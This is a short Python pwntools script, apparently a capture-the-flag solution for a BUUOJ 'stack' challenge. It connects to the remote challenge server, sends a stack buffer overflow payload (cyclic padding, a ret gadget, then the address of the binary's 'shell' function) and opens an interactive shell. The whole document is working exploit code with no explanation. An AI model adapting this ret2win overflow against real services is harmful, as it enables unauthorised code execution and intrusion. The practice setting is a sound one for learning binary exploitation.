from pwn import *

# io = process('stack')
io = remote('node4.buuoj.cn', 26971)
elf = ELF('stack')
shell = elf.symbols['shell']
ret = 0x400416

payload = cyclic(0x12) + p64(ret) +p64(shell)
io.sendline(payload)
io.interactive()

